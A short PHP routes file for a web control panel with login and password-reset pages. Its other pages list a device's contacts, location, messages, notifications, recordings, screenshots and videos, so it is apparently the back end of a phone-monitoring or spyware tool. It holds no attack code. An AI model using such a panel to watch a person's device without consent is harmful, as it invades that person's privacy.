<?php

require __DIR__ . '/routes.php';

$route->get('/login', fn() => $authentication->loginView());
$route->post('/login', fn() => $authentication->login());

$route->get('/logout', fn()=> $authentication->logout());

$route->get('/reset-password', fn() => $authentication->resetPasswordView());
$route->post('/reset-password', fn() => $authentication->resetPassword());

$route->get('/', fn() => $controlPanel->home());
$route->get('/contacts', fn() => $controlPanel->contacts());
$route->get('/images', fn() => $controlPanel->images());
$route->get('/installed-apps', fn() => $controlPanel->installedApps());
$route->get('/location', fn() => $controlPanel->location());
$route->get('/messages', fn() => $controlPanel->messages());
$route->get('/notifications', fn() => $controlPanel->notifications());
$route->get('/recordings', fn() => $controlPanel->recordings());
$route->get('/screenshots', fn() => $controlPanel->screenshots());
$route->get('/videos', fn() => $controlPanel->videos());

$route->submit();